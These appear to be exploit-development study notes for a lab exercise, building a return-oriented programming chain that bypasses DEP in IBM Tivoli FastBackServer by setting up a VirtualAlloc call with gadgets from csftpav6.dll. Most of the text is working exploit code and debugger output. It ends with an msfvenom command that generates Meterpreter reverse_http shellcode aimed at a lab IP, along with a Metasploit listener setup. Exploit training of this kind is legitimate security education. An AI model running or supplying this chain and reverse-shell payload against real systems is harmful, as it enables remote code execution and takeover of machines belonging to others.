# Summary

## Turn on DEP

1. Navigate to **Windows Defender Security Center**
2. Select **App & Browser control**
3. Select **Exploit Protection Settings**
4. Select **Program Settings**
5. Click **Add program to customize**
6. Select **Choose exact file path**
7. **Navigate to** `C:\Program Files\Tivoli\TSM\FastBack\server` then select `FastBackServer.exe`
8. Under **Data Execution Prevention (DEP)** select **Override system settings** and **On**. Then click **Apply**
9. Restart the FastBackServer service

##

## Prepare Dummy Shellcode

```python
# Example Dummy Shellcode
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # dummy Shellcode Return Address
va += pack("<L", (0x47474747)) # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
```

```
offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
rop = b"C" * (0x400 - 276 - 4)
```

##

```bash
# Using the module file with no bad characters find the VirtualAlloc
ropper --file /home/kali/share/OSED/csftpav6.dll --imports | grep VirtualAlloc
```

### Finding address of dummy DWORD

In summary. We crash the application and find the offset to the **<45454545>** dummy DWORD.&#x20;

Crash the application with the usual AAAAA|BBBB|CCCCCCCC payload. Then use a command similar to the one below to find the exact offset.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
dd esp -1C
```
{% endcode %}

Ideal gadget is `sub esi, 0x1C` ; ret however this is probably not found. We could put 0x1C on the stack and then pop that into a register however 0x1C value is really 0x0000001C, which has NULL bytes in it. We get around this by using the negative value.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
? -0x1c
```

### Get the ESI Address into a register

Search for another gadget using `ropper`.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "mov ???, esi%ret" --badbytes 00090A0B0C0D20
```
{% endcode %}

Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value into ECX and add it to EAX. We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction

<figure><img src="../../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "pop ecx; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "add eax, ecx; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

We can now update the code as below.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

With the correct value in EAX, it needs to be copied back to ESI. So find a gadget to do this.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "push eax; pop esi; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

IAT address for _VirtualAlloc_ is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

### Patching the return address

At the end of the last run we had the address of dummy shellcode for VirtualAlloc (45454545) in the ESI register. To get the address for the dummy Shellcode Return Address (46464646) we can just increment the ESI register 4 times.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

With ESI aligned we now need to get the shellcode address then reuse the "MOV DWORD \[ESI], EAX ; RET" gadget to patch the placeholder value. We can simply add a fixed value and add it to the value in ESI. However we need to retain ESI for patching the dummy memory address. So with the available gadgets what we are doing here is moving esi to eax then cloberring esi with junk. Then restoring esi. Then popping the arbitrary value into ecx (To be updated once wek now the actual offset). Then subtracting ecx from eax to get the value. Then we write the address to the dummy Shellcode Return Address (46464646) value.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

### Patching Arguments

_lpAddress_  # dummy Shellcode Address (47474747). Should be set to the same as the return address.  So we can just increment the ESI 4 times and the other gadgets we used previously. However the offset we use will be different as we increased ESI by 4 so we use -0x20c.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

_`dwSize #`_` ``dummy dwSize (48484848)`. First increment 4 times to get ESI to point to the correct address. Pop the value -1 into EAX then use the neg instruction to convert it to a positive value.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x50527840)) # neg eax ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

_`flAllocationType`_` ``# dummy flAllocationType  (49494949)`. Must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes. Use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

`flProtect # dummy flProtect (51515151)`. Reuse the same technique done for `flAllocationType` .

```bash
0:063> ? 40 - 80808080
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0

0:063> ? 80808080 + 7f7f7fc0
Evaluate expression: 4294967360 = 00000001`00000040
```

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

### Executing VirtualAlloc

When the ROP chain is finished patching the arguments for _VirtualAlloc_, ESI will contain the stack address of the last argument (_flProtect_). To obtain the stack address where _VirtualAlloc_ was patched, we can move the contents of ESI into EAX and subtract a small value from it.

Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the _VirtualAlloc_ address on the stack.

Once EAX contains the correct address, we move its content into EBP through an XCHG EAX, EBP; RET gadget. Finally, we can move the contents of EBP into ESP with the gadget we initially found.

The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the _VirtualAlloc_ address is popped into EBP.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

```bash
# Breakpoint to use for running the code
bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
```

```bash
# Step through code until mov edi,edi
p
...
p
# Check memory protections before running VirtualAlloc
dds esp L1
!vprot 0d55e514
# Check again after to confirm memory is now executeable
pt
!vprot 0d55e514
```

The final step required is to align our shellcode with the return address. Instead of modifying the offsets used in the ROP chain, we could also insert several padding bytes before the shellcode.

To find the number of padding bytes we need, we return out of _VirtualAlloc_ and obtain the address of the first instruction we are executing on the stack. Next, we dump the contents of the stack and obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.

```
0:006> p
eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000
eip=0d55e514 esp=0d55e318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d55e514 43              inc     ebx

0:006> dd esp + 100
0d55e418  5050118e 42424242 505115a3 ffffffe8
0d55e428  5051579a 5051571f 50533cbf 43434343
0d55e438  43434343 43434343 43434343 43434343
0d55e448  43434343 43434343 43434343 43434343
0d55e458  43434343 43434343 43434343 43434343
0d55e468  43434343 43434343 43434343 43434343
0d55e478  43434343 43434343 43434343 43434343
0d55e488  43434343 43434343 43434343 43434343

0:006> ? 0d55e514  - 0d55e434  
Evaluate expression: 224 = 000000e0
```

The calculation indicates we need 224 bytes of padding. Now we can update the proof of concept to include padding and a dummy shellcode after the ROP chain. This will help us verify that everything is setup correctly before including the real payload. These changes are reflected in the listing below.

{% code overflow="wrap" %}
```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret

padding = b"C" * 0xe0

shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop+padding+shellcode,0,0,0,0)
buf += formatString
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Set a breakpoint. 
bp KERNEL32!VirtualAllocStub
g
# Step over the VirtualAlloc call
pt
# Should land in the dummy shellcode (int3) instructions which should not through an exception. 
```
{% endcode %}

### Getting a Reverse Shell

{% code overflow="wrap" %}
```bash
# Generate shellcode
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.45.230 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
# Setup a listener
use multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.45.230
set lport 8080
exploit

```
{% endcode %}
